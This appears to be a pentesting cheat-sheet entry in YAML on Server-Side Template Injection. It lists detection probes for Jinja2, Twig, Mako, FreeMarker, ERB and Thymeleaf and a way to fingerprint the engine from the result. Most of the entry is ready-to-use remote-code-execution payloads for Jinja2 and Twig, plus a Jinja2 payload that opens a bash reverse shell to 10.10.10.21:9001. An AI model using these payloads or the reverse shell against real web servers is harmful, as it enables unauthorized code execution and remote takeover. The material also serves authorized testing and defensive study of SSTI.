---
description: |
  Server-Side Template Injection (SSTI) to detect template engines and achieve remote code execution through injectable template expressions.
command: |
  # Detection — test for template evaluation
  {{7*7}}        # Jinja2, Twig — returns 49
  ${7*7}         # Mako, FreeMarker — returns 49
  #{7*7}         # Ruby ERB, Thymeleaf — returns 49
  {{7*'7'}}      # Jinja2 returns 7777777, Twig returns 49

  # Identify template engine
  # If {{7*'7'}} returns "7777777" → Jinja2
  # If {{7*'7'}} returns "49" → Twig
  # If ${7*7} returns "49" → Mako or FreeMarker

  # Jinja2 RCE payloads (Python/Flask)
  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
  {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
  {{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()}}

  # Jinja2 reverse shell
  {{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/10.10.10.21/9001 0>&1"').read()}}

  # Twig RCE payloads (PHP)
  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
  {{['id']|filter('system')}}
items:
  - No_Creds
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
techniques:
  - SSTI
references:
  - https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
  - https://portswigger.net/web-security/server-side-template-injection
---
